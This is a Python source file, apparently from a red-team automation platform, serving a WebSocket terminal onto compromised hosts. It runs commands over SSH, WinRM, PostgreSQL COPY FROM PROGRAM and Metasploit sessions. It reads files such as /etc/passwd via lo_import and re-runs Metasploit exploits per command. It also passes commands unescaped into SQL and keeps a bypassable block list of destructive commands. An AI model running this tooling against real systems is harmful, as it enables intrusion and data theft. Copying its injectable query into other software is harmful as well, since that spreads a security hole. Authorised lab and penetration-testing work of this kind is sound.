# Copyright 2026 Athena Contributors
#
# Use of this software is governed by the Business Source License 1.1
# included in the LICENSE file.
#
# Change Date: Four years from release date of each version
# Change License: Apache License, Version 2.0
#
# For commercial licensing, contact: azz093093.830330@gmail.com

"""Interactive terminal WebSocket endpoint for compromised targets.

Supports two backends:
  1. SSH (via asyncssh) — when a valid credential.ssh fact exists
  2. Metasploit shell session — when credential.root_shell exists (fallback)
"""

import asyncio
import json
import logging

from fastapi import APIRouter, WebSocket, WebSocketDisconnect

from app.database import db_manager

logger = logging.getLogger(__name__)

router = APIRouter()

# Commands that could destroy the lab environment — refuse these
_CMD_BLACKLIST = ("rm -rf /", "mkfs", "dd if=/dev/zero", "> /dev/sda", "shred /dev")

MAX_CMD_LEN = 1024


def _is_dangerous(cmd: str) -> bool:
    lower = cmd.lower()
    return any(bad in lower for bad in _CMD_BLACKLIST)


@router.websocket("/ws/{operation_id}/targets/{target_id}/terminal")


async def ssh_terminal(
    operation_id: str,
    target_id: str,
    websocket: WebSocket,
):
    """Interactive SSH terminal for compromised targets.

    Client sends:  {"cmd": "whoami"}
    Server sends:  {"output": "msfadmin\\n", "exit_code": 0}
                or {"error": "..."}
    """
    await websocket.accept()

    async with db_manager.connection() as db:

        # Verify target exists and is compromised
        # operation_id from frontend may be empty string; look up by id only.
        target = await db.fetchrow(
            "SELECT id, hostname, ip_address, is_compromised FROM targets "
            "WHERE id = $1",
            target_id,
        )
        if not target:
            await websocket.send_text(json.dumps({"error": "Target not found"}))
            await websocket.close()
            return

        if not target["is_compromised"]:
            await websocket.send_text(json.dumps({"error": "Target is not compromised"}))
            await websocket.close()
            return

        ip_address = target["ip_address"]
        hostname = target["hostname"] or ip_address

        # Credential lookup helper — searches by source_target_id first,
        # then falls back to ip_address in the value string so the terminal
        # works regardless of which operation_id the frontend sends.
        async def _find_cred(trait: str, value_like: str | None = None) -> "asyncpg.Record | None":
            if value_like:
                row = await db.fetchrow(
                    "SELECT value FROM facts "
                    "WHERE source_target_id = $1 AND trait = $2 AND value LIKE $3 "
                    "ORDER BY collected_at DESC LIMIT 1",
                    target_id, trait, value_like,
                )
            else:
                row = await db.fetchrow(
                    "SELECT value FROM facts "
                    "WHERE source_target_id = $1 AND trait = $2 "
                    "ORDER BY collected_at DESC LIMIT 1",
                    target_id, trait,
                )
            if row:
                return row
            # Fallback: match ip_address inside the value column
            if value_like:
                return await db.fetchrow(
                    "SELECT value FROM facts "
                    "WHERE trait = $1 AND value LIKE $2 AND value LIKE $3 "
                    "ORDER BY collected_at DESC LIMIT 1",
                    trait, f"%{ip_address}%", value_like,
                )
            return await db.fetchrow(
                "SELECT value FROM facts "
                "WHERE trait = $1 AND value LIKE $2 "
                "ORDER BY collected_at DESC LIMIT 1",
                trait, f"%{ip_address}%",
            )

        cred_row    = await _find_cred("credential.ssh")
        msf_row     = await _find_cred("credential.root_shell")
        winrm_row   = await _find_cred("credential.winrm")
        pg_shell_row = await _find_cred("credential.shell", "postgresql%")

    # Decide backend: SSH > WinRM > PostgreSQL > Metasploit
    use_msf = False

    if cred_row:
        cred_value = cred_row["value"]
        # Defence-in-depth: validate credential format
        if "@" not in cred_value or ":" not in cred_value.split("@")[0]:
            cred_row = None  # fall through to Metasploit

    if cred_row:
        # Try SSH first
        from app.clients._ssh_common import _parse_credential  # noqa: PLC0415
        try:
            user, password, host, port = _parse_credential(cred_row["value"])
            if not host:
                host = ip_address
        except Exception as exc:
            logger.warning("Invalid SSH credential for terminal: %s", exc)
            cred_row = None  # fall through to Metasploit

    if cred_row:
        import asyncssh  # noqa: PLC0415
        _MAX_RETRIES = 3
        _RETRY_DELAYS = (1, 3, 5)
        conn = None
        last_error: Exception | None = None
        for attempt in range(_MAX_RETRIES):
            try:
                conn = await asyncssh.connect(
                    host, port=port, username=user, password=password,
                    known_hosts=None, connect_timeout=15,
                    server_host_key_algs=["ssh-rsa", "ssh-dss", "ecdsa-sha2-nistp256",
                                          "rsa-sha2-256", "rsa-sha2-512"],
                    kex_algs=["diffie-hellman-group14-sha1",
                              "diffie-hellman-group-exchange-sha256",
                              "diffie-hellman-group14-sha256",
                              "ecdh-sha2-nistp256"],
                )
                break
            except Exception as exc:  # noqa: BLE001
                last_error = exc
                logger.warning(
                    "SSH terminal attempt %d/%d failed for %s@%s:%s: %s",
                    attempt + 1, _MAX_RETRIES, user, host, port, exc,
                )
                if attempt < _MAX_RETRIES - 1:
                    await asyncio.sleep(_RETRY_DELAYS[attempt])

        if conn is not None:
            # SSH connected — use SSH backend
            await _run_ssh_terminal(websocket, conn, user, hostname, host)
            return
        else:
            logger.warning(
                "SSH failed after %d attempts, checking Metasploit fallback", _MAX_RETRIES
            )

    # Fallback 1: WinRM (Windows targets)
    if winrm_row:
        await _run_winrm_terminal(websocket, winrm_row["value"], hostname, ip_address)
        return

    # Fallback 2: PostgreSQL COPY TO PROGRAM shell
    if pg_shell_row:
        await _run_pg_terminal(websocket, pg_shell_row["value"], hostname, ip_address)
        return

    # Fallback 3: Metasploit shell session
    if msf_row:
        use_msf = True
    else:
        await websocket.send_text(json.dumps({
            "error": "No valid credential found — SSH failed and no Metasploit shell available"
        }))
        await websocket.close()
        return

    if use_msf:
        await _run_msf_terminal(
            websocket, ip_address, hostname, target_id, operation_id,
        )


async def _run_ssh_terminal(
    websocket: WebSocket, conn, user: str, hostname: str, host: str
) -> None:
    """Run interactive SSH terminal loop."""
    await websocket.send_text(json.dumps({
        "output": f"Connected to {hostname} ({host}) as {user}\r\n",
        "exit_code": 0,
        "prompt": f"{user}@{hostname}:~$ ",
    }))
    try:
        async for message in websocket.iter_text():
            try:
                data = json.loads(message)
                cmd = str(data.get("cmd", "")).strip()
            except (json.JSONDecodeError, AttributeError):
                await websocket.send_text(json.dumps({"error": "Invalid JSON"}))
                continue

            if not cmd:
                continue
            if len(cmd) > MAX_CMD_LEN:
                await websocket.send_text(json.dumps({"error": "Command too long (max 1024 chars)"}))
                continue
            if _is_dangerous(cmd):
                await websocket.send_text(json.dumps({"error": "Command refused: potentially destructive operation"}))
                continue

            try:
                result = await conn.run(cmd, timeout=30)
                stdout = result.stdout or ""
                stderr = result.stderr or ""
                output = stdout if stdout else stderr
                exit_code = result.exit_status if result.exit_status is not None else 0
                await websocket.send_text(json.dumps({
                    "output": output,
                    "exit_code": exit_code,
                    "prompt": f"{user}@{hostname}:~$ ",
                }))
            except Exception as exc:
                await websocket.send_text(json.dumps({"error": str(exc)}))
    except WebSocketDisconnect:
        pass
    finally:
        try:
            conn.close()
            await conn.wait_closed()
        except Exception:
            pass
        logger.info("SSH terminal session closed for %s", hostname)


async def _run_winrm_terminal(
    websocket: WebSocket, cred_value: str, hostname: str, ip_address: str
) -> None:
    """Run interactive terminal via WinRM (Windows targets).

    Credential format: user:password@host:port
    Each command is sent as a one-shot WinRM run_cmd call.
    Not a persistent PTY — suitable for Windows admin shells.
    """
    import winrm  # noqa: PLC0415

    # Parse: user:password@host:port
    try:
        at_idx = cred_value.rfind("@")
        user_pass = cred_value[:at_idx]
        host_port = cred_value[at_idx + 1:]
        colon_idx = user_pass.find(":")
        username = user_pass[:colon_idx]
        password = user_pass[colon_idx + 1:]
        if ":" in host_port:
            host, port_s = host_port.rsplit(":", 1)
            port = int(port_s)
        else:
            host = host_port
            port = 5985
    except Exception as exc:
        await websocket.send_text(json.dumps({"error": f"Invalid WinRM credential: {exc}"}))
        await websocket.close()
        return

    if not host:
        host = ip_address

    await websocket.send_text(json.dumps({
        "output": (
            f"Connected to {hostname} ({host}) via WinRM as {username}\r\n"
            f"[athena] Mode: WinRM one-shot exec (non-persistent PTY)\r\n"
            f"[athena] Each command is a fresh WinRM run_cmd call.\r\n"
        ),
        "exit_code": 0,
        "prompt": f"PS {hostname}> ",
    }))

    try:
        async for message in websocket.iter_text():
            try:
                data = json.loads(message)
                cmd = str(data.get("cmd", "")).strip()
            except (json.JSONDecodeError, AttributeError):
                await websocket.send_text(json.dumps({"error": "Invalid JSON"}))
                continue

            if not cmd:
                continue
            if len(cmd) > MAX_CMD_LEN:
                await websocket.send_text(json.dumps({"error": "Command too long (max 1024 chars)"}))
                continue
            if _is_dangerous(cmd):
                await websocket.send_text(json.dumps({"error": "Command refused: potentially destructive operation"}))
                continue

            try:
                loop = asyncio.get_running_loop()

                def _winrm_exec():
                    s = winrm.Session(
                        f"http://{host}:{port}/wsman",
                        auth=(username, password),
                        transport="ntlm",
                    )
                    # Try PowerShell first, fall back to cmd
                    try:
                        r = s.run_ps(cmd)
                        out = r.std_out.decode(errors="replace")
                        err = r.std_err.decode(errors="replace")
                    except Exception:
                        r = s.run_cmd(cmd)
                        out = r.std_out.decode(errors="replace")
                        err = r.std_err.decode(errors="replace")
                    return out or err or "(no output)\r\n", r.status_code

                output, exit_code = await loop.run_in_executor(None, _winrm_exec)
                await websocket.send_text(json.dumps({
                    "output": output,
                    "exit_code": exit_code,
                    "prompt": f"PS {hostname}> ",
                }))
            except Exception as exc:
                await websocket.send_text(json.dumps({"error": f"WinRM error: {exc}"}))
    except WebSocketDisconnect:
        pass
    finally:
        logger.info("WinRM terminal session closed for %s", hostname)


def _parse_pg_shell_credential(value: str) -> tuple[str, str, str, int]:
    """Parse a credential.shell value like 'postgresql_exec:user:pass@host:port (...)'.

    Returns (username, password, host, port).
    """
    # Strip the method prefix and trailing info
    # Format: postgresql_exec:user:pass@host:port (output...)
    #     or: postgresql_fileread:user:pass@host:port (output...)
    rest = value.split(":", 1)[1] if ":" in value else value  # drop prefix
    # rest = "user:pass@host:port (output...)"
    paren_idx = rest.find(" (")
    if paren_idx > 0:
        rest = rest[:paren_idx]
    # rest = "user:pass@host:port"
    at_idx = rest.rfind("@")
    if at_idx < 0:
        raise ValueError(f"No '@' in pg credential: {value}")
    user_pass = rest[:at_idx]
    host_port = rest[at_idx + 1:]

    colon_idx = user_pass.find(":")
    if colon_idx < 0:
        raise ValueError(f"No ':' separating user:pass in pg credential: {value}")
    username = user_pass[:colon_idx]
    password = user_pass[colon_idx + 1:]

    if ":" in host_port:
        host, port_s = host_port.rsplit(":", 1)
        port = int(port_s)
    else:
        host = host_port
        port = 5432

    return username, password, host, port


async def _run_pg_terminal(
    websocket: WebSocket, cred_value: str, hostname: str, ip_address: str
) -> None:
    """Run interactive terminal via PostgreSQL COPY TO PROGRAM.

    Each command is executed by connecting to PostgreSQL and running
    COPY FROM PROGRAM. This is slower than SSH but works when the only
    access vector is a PostgreSQL superuser credential.
    """
    try:
        username, password, host, port = _parse_pg_shell_credential(cred_value)
    except (ValueError, IndexError) as exc:
        logger.warning("Failed to parse PostgreSQL shell credential: %s", exc)
        await websocket.send_text(json.dumps({
            "error": f"Invalid PostgreSQL shell credential format: {exc}"
        }))
        await websocket.close()
        return

    if not host:
        host = ip_address

    await websocket.send_text(json.dumps({
        "output": (
            f"Connected to {hostname} ({host}) via PostgreSQL superuser\r\n"
            f"User: {username} | Port: {port}\r\n"
        ),
        "exit_code": 0,
        "prompt": f"{username}@{hostname}:~$ ",
    }))

    try:
        async for message in websocket.iter_text():
            try:
                data = json.loads(message)
                cmd = str(data.get("cmd", "")).strip()
            except (json.JSONDecodeError, AttributeError):
                await websocket.send_text(json.dumps({"error": "Invalid JSON"}))
                continue

            if not cmd:
                continue
            if len(cmd) > MAX_CMD_LEN:
                await websocket.send_text(json.dumps({
                    "error": "Command too long (max 1024 chars)",
                }))
                continue
            if _is_dangerous(cmd):
                await websocket.send_text(json.dumps({
                    "error": "Command refused: potentially destructive operation",
                }))
                continue

            try:
                output = await _pg_exec_command(host, port, username, password, cmd)
                await websocket.send_text(json.dumps({
                    "output": output or "(no output)\r\n",
                    "exit_code": 0,
                    "prompt": f"{username}@{hostname}:~$ ",
                }))
            except Exception as exc:
                await websocket.send_text(json.dumps({
                    "error": f"PostgreSQL exec error: {exc}",
                }))
    except WebSocketDisconnect:
        pass
    finally:
        logger.info("PostgreSQL terminal session closed for %s", hostname)


async def _pg_exec_command(
    host: str, port: int, username: str, password: str, command: str
) -> str:
    """Execute a command via PostgreSQL superuser access.

    Strategy (ordered by PostgreSQL version support):
    1. COPY FROM PROGRAM (PostgreSQL >= 9.3) — direct OS command exec
    2. lo_import file read (PostgreSQL 8.x+) — supports 'cat <path>' style
    3. SQL passthrough — runs raw SQL for queries like SELECT, SHOW, etc.
    """
    import psycopg2  # noqa: PLC0415

    loop = asyncio.get_running_loop()

    def _exec():
        conn = psycopg2.connect(
            host=host, port=port, user=username, password=password,
            connect_timeout=10,
        )
        conn.autocommit = True
        cursor = conn.cursor()
        try:
            # Method 1: COPY FROM PROGRAM (PostgreSQL >= 9.3)
            try:
                cursor.execute("CREATE TEMP TABLE _athena_term (line TEXT)")
                cursor.execute(f"COPY _athena_term FROM PROGRAM '{command}'")
                cursor.execute("SELECT string_agg(line, E'\\n') FROM _athena_term")
                row = cursor.fetchone()
                result = (row[0] or "") if row else ""
                cursor.execute("DROP TABLE IF EXISTS _athena_term")
                return result
            except psycopg2.errors.SyntaxError:
                # PostgreSQL < 9.3: COPY TO PROGRAM not supported
                conn.rollback()
            except psycopg2.errors.InsufficientPrivilege:
                conn.rollback()

            # Method 2: lo_import for 'cat <path>' style commands
            cmd_lower = command.strip()
            if cmd_lower.startswith("cat "):
                filepath = cmd_lower[4:].strip().strip("'\"")
                return _pg_read_file(conn, cursor, filepath)

            # Method 3: SQL passthrough for SQL-like commands
            sql_prefixes = ("select ", "show ", "\\d", "explain ")
            if cmd_lower.lower().startswith(sql_prefixes):
                cursor.execute(command)
                rows = cursor.fetchall()
                if cursor.description:
                    headers = [d[0] for d in cursor.description]
                    lines = ["\t".join(headers)]
                    for row in rows:
                        lines.append("\t".join(str(c) for c in row))
                    return "\n".join(lines)
                return "(no results)"

            # Method 4: Try common read-equivalent translations
            file_commands = {
                "id": "/etc/passwd",        # show users as substitute
                "uname -a": "/proc/version",
                "hostname": "/etc/hostname",
                "ifconfig": "/proc/net/if_inet6",
                "whoami": None,  # special case
            }
            if cmd_lower in file_commands:
                if cmd_lower == "whoami":
                    return username
                fpath = file_commands[cmd_lower]
                if fpath:
                    return _pg_read_file(conn, cursor, fpath)

            return (
                f"[athena] PostgreSQL 8.x: COPY TO PROGRAM not supported.\r\n"
                f"Available commands:\r\n"
                f"  cat <filepath>  - Read a file (via lo_import)\r\n"
                f"  SELECT ...      - Run SQL queries\r\n"
                f"  id / uname -a / hostname / whoami - System info\r\n"
            )
        finally:
            conn.close()

    return await loop.run_in_executor(None, _exec)


def _pg_read_file(conn, cursor, filepath: str) -> str:
    """Read a file via PostgreSQL lo_import (works on 8.x+)."""
    import psycopg2  # noqa: PLC0415
    try:
        conn.autocommit = False
        cursor.execute("SELECT lo_import(%s)", (filepath,))
        oid = cursor.fetchone()[0]
        conn.commit()

        lobj = conn.lobject(oid, "r")
        data = lobj.read(8192)
        lobj.close()
        cursor.execute("SELECT lo_unlink(%s)", (oid,))
        conn.commit()
        conn.autocommit = True
        return data or "(empty file)"
    except psycopg2.errors.UndefinedFile:
        conn.rollback()
        conn.autocommit = True
        return f"cat: {filepath}: No such file or directory"
    except Exception as exc:
        conn.rollback()
        conn.autocommit = True
        return f"cat: {filepath}: {exc}"


async def _run_msf_terminal(
    websocket: WebSocket,
    target_ip: str,
    hostname: str,
    target_id: str,
    operation_id: str,
) -> None:
    """Run interactive terminal via Metasploit shell session.

    SPEC-053: under one-shot mode, there is no persistent session to
    reuse. If no existing session is found, infer the exploitable
    service from facts and re-run the matching exploit to establish a
    fresh session for this websocket. ``target_id`` and ``operation_id``
    are required so we can query the facts table.
    """
    from app.config import settings  # noqa: PLC0415

    if settings.MOCK_METASPLOIT:
        await websocket.send_text(json.dumps({
            "output": f"[mock] Connected to {hostname} ({target_ip}) via Metasploit shell\r\n",
            "exit_code": 0,
            "prompt": f"root@{hostname}:~# ",
        }))
        try:
            async for message in websocket.iter_text():
                try:
                    data = json.loads(message)
                    cmd = str(data.get("cmd", "")).strip()
                except (json.JSONDecodeError, AttributeError):
                    continue
                if cmd:
                    await websocket.send_text(json.dumps({
                        "output": f"[mock] {cmd}: command executed\r\n",
                        "exit_code": 0,
                        "prompt": f"root@{hostname}:~# ",
                    }))
        except WebSocketDisconnect:
            pass
        return

    try:
        from pymetasploit3.msfrpc import MsfRpcClient  # noqa: PLC0415
    except ImportError:
        await websocket.send_text(json.dumps({"error": "pymetasploit3 not installed"}))
        await websocket.close()
        return

    try:
        client = await asyncio.get_running_loop().run_in_executor(
            None,
            lambda: MsfRpcClient(
                settings.MSF_RPC_PASSWORD,
                server=settings.MSF_RPC_HOST,
                port=settings.MSF_RPC_PORT,
                username=settings.MSF_RPC_USER,
                ssl=settings.MSF_RPC_SSL,
            ),
        )
    except Exception as exc:
        await websocket.send_text(json.dumps({"error": f"Metasploit RPC connection failed: {exc}"}))
        await websocket.close()
        return

    # ------------------------------------------------------------------
    # SPEC-053: one-shot exploit mode — no persistent session reuse.
    #
    # There are two sub-paths:
    #
    # (A) Pre-existing session: a session for this target already exists
    #     in msfrpcd (e.g. a very recent OODA exploit that hasn't been
    #     reaped, or an environment that pre-dates one-shot mode). We
    #     adopt it and drive an interactive shell loop as before.
    #
    # (B) No session: infer the exploitable service from facts and
    #     re-run that exploit **per command**. Each command triggers
    #     a fresh exploit → probe → release cycle. This is slower
    #     than interactive mode but is safe against stale zombie shells
    #     (see ADR-047 diagnostic note on vsftpd 2.3.4 backdoor).
    # ------------------------------------------------------------------

    # Path A probe
    pre_existing_shell = None
    pre_existing_sid = None
    for s_id, info in client.sessions.list.items():
        if info.get("target_host") == target_ip:
            pre_existing_shell = client.sessions.session(s_id)
            pre_existing_sid = s_id
            logger.info(
                "Terminal reusing pre-existing session %s for %s",
                pre_existing_sid, target_ip,
            )
            break

    if pre_existing_shell is not None:
        await _run_msf_terminal_with_session(
            websocket, pre_existing_shell, pre_existing_sid,
            target_ip, hostname,
        )
        return

    # Path B: re-exploit per command
    from app.clients.metasploit_client import MetasploitRPCEngine  # noqa: PLC0415
    from app.database import db_manager as _db_mgr  # noqa: PLC0415
    from app.services.engine_router import _KNOWN_EXPLOITABLE_BANNERS  # noqa: PLC0415

    async with _db_mgr.connection() as _db:
        rows = await _db.fetch(
            "SELECT value FROM facts WHERE source_target_id = $1 "
            "AND operation_id = $2 AND trait = 'service.open_port'",
            target_id, operation_id,
        )
    inferred_service: "str | None" = None
    for row in rows:
        val_lower = (row["value"] or "").lower()
        for banner_key, svc in _KNOWN_EXPLOITABLE_BANNERS.items():
            if banner_key in val_lower:
                inferred_service = svc
                break
        if inferred_service:
            break

    if inferred_service is None:
        await websocket.send_text(json.dumps({
            "error": (
                f"No active Metasploit session for {target_ip} and no "
                "exploitable banner found to re-establish shell"
            )
        }))
        await websocket.close()
        return

    msf = MetasploitRPCEngine()
    exploit_fn = msf.get_exploit_for_service(inferred_service)
    if exploit_fn is None:
        await websocket.send_text(json.dumps({
            "error": (
                f"No exploit handler for inferred service "
                f"{inferred_service!r}"
            )
        }))
        await websocket.close()
        return

    await websocket.send_text(json.dumps({
        "output": (
            f"[athena] Metasploit one-shot mode active for {hostname}.\r\n"
            f"[athena] Each command triggers a fresh "
            f"{inferred_service} exploit cycle (exploit -> probe -> "
            f"release). Type a shell command and press enter.\r\n"
        ),
        "exit_code": 0,
        "prompt": f"root@{hostname}:~# ",
    }))

    try:
        async for message in websocket.iter_text():
            try:
                data = json.loads(message)
                cmd = str(data.get("cmd", "")).strip()
            except (json.JSONDecodeError, AttributeError):
                await websocket.send_text(json.dumps({"error": "Invalid JSON"}))
                continue

            if not cmd:
                continue
            if len(cmd) > MAX_CMD_LEN:
                await websocket.send_text(json.dumps({
                    "error": "Command too long (max 1024 chars)",
                }))
                continue
            if _is_dangerous(cmd):
                await websocket.send_text(json.dumps({
                    "error": (
                        "Command refused: potentially destructive operation"
                    ),
                }))
                continue

            # Re-exploit via the bound method returned by
            # get_exploit_for_service. SPEC-054: this routes through
            # exploit_samba / exploit_unrealircd etc., which read LHOST
            # from settings.RELAY_IP automatically. Calling _run_exploit
            # directly would bypass that injection and always send the
            # legacy hardcoded "0.0.0.0".
            try:
                result = await exploit_fn(target_ip, probe_cmd=cmd)
            except Exception as exc:
                await websocket.send_text(json.dumps({
                    "error": f"Re-exploit failed: {exc}",
                }))
                continue

            if result.get("status") != "success":
                await websocket.send_text(json.dumps({
                    "error": (
                        f"Exploit failed: {result.get('reason', 'unknown')}"
                    ),
                }))
                continue

            await websocket.send_text(json.dumps({
                "output": result.get("output") or "(no output)\r\n",
                "exit_code": 0,
                "prompt": f"root@{hostname}:~# ",
            }))
    except WebSocketDisconnect:
        pass
    finally:
        logger.info(
            "Metasploit one-shot terminal session closed for %s (%s)",
            hostname, target_ip,
        )


def _exploit_module_and_payload(service: str) -> tuple[str, str]:
    """Resolve (module_path, payload) for a service name.

    Thin wrapper around metasploit_client._EXPLOIT_MAP so the terminal
    router can drive ``_run_exploit`` directly. Defaults to vsftpd
    backdoor tuple if the service is unknown — the caller already
    checked ``get_exploit_for_service`` so an unknown value here is
    defensive only.
    """
    from app.clients.metasploit_client import _EXPLOIT_MAP  # noqa: PLC0415
    return _EXPLOIT_MAP.get(service, _EXPLOIT_MAP["vsftpd"])


async def _run_msf_terminal_with_session(
    websocket: WebSocket,
    shell,  # pymetasploit3 Session
    sid: str,
    target_ip: str,
    hostname: str,
) -> None:
    """Interactive loop over a pre-existing Metasploit session.

    Used only when ``_run_msf_terminal`` found a live session already
    in msfrpcd's session table. In one-shot mode this is rare but
    possible (e.g. a technique execution still racing the terminal
    open). The shell is NOT stopped on close — the OODA cycle that
    created it is responsible for its lifecycle.
    """
    await websocket.send_text(json.dumps({
        "output": (
            f"Connected to {hostname} ({target_ip}) via Metasploit "
            f"shell (session {sid})\r\n"
        ),
        "exit_code": 0,
        "prompt": f"root@{hostname}:~# ",
    }))

    try:
        async for message in websocket.iter_text():
            try:
                data = json.loads(message)
                cmd = str(data.get("cmd", "")).strip()
            except (json.JSONDecodeError, AttributeError):
                await websocket.send_text(json.dumps({"error": "Invalid JSON"}))
                continue

            if not cmd:
                continue
            if len(cmd) > MAX_CMD_LEN:
                await websocket.send_text(json.dumps({
                    "error": "Command too long (max 1024 chars)",
                }))
                continue
            if _is_dangerous(cmd):
                await websocket.send_text(json.dumps({
                    "error": (
                        "Command refused: potentially destructive operation"
                    ),
                }))
                continue

            try:
                # Drain any stale output first
                shell.read()
                # Send command
                shell.write(cmd + "\n")
                # Wait for output
                await asyncio.sleep(2)
                output = shell.read()
                await websocket.send_text(json.dumps({
                    "output": output or "(no output)\r\n",
                    "exit_code": 0,
                    "prompt": f"root@{hostname}:~# ",
                }))
            except Exception as exc:
                await websocket.send_text(json.dumps({
                    "error": f"Shell error: {exc}",
                }))
    except WebSocketDisconnect:
        pass
    finally:
        logger.info(
            "Metasploit terminal session closed for %s (session %s)",
            hostname, sid,
        )
